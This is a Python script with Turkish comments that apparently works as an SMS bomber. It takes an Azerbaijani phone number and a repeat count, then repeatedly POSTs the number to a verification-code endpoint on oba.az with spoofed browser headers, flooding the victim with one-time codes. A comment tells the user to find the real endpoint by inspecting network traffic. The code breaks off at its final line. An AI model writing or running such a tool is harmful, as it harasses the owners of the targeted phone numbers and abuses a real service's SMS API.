import time
import random
import sys
import requests

def send_real_sms(phone_number):
    # BU ÖRNEKTE GERÇEK ENDPOINT YOKTUR. SEN NETWORK'TEN BULMALISIN.
    url = "https://oba.az/api/send-code"  # Değiştirmen gerekiyor!
    
    payload = {
        "phone": phone_number
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Referer": "https://oba.az/cabinet/qeydiyyat-1/?reset=1"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[✓] Gerçek SMS isteği gönderildi (cevap: 200 OK)")
        else:
            print(f"[!] Gerçek SMS isteği başarısız (Durum: {response.status_code})")
            print("Yanıt:", response.text)
    except Exception as e:
        print(f"[X] Hata oluştu: {e}")

def send_fake_sms(phone_number, message):
    print(f"[✓] Mesaj gönderiliyor: {phone_number} -> {message}")
    time.sleep(random.uniform(0.5, 1.5))  # Gerçek SMS gecikmesini simüle eder
    print("[✓] Gönderildi (Simülasyon)")

def main():
    phone = input("Telefon numarası (örn: +994xxxxxxxxx): ").strip()

    if not phone.startswith("+994") or not phone[1:].isdigit() or len(phone) != 13:
        print("[X] Hatalı numara! Sadece +994 ile başlayan 13 haneli numaralar kabul edilir.")
        sys.exit()

    message = input("Mesaj içeriği: ")
    try:
        count = int(input("Kaç SMS gönderilsin?: "))
    except ValueError:
        print("[X] Geçerli bir sayı girilmedi!")
        sys.exit()

    for i in range(count):
        print(f"\n[+] {i+1}. SMS Gönderimi")
        send_fake_sms(phone, message)
        send_real_sms(phone)

if __name__
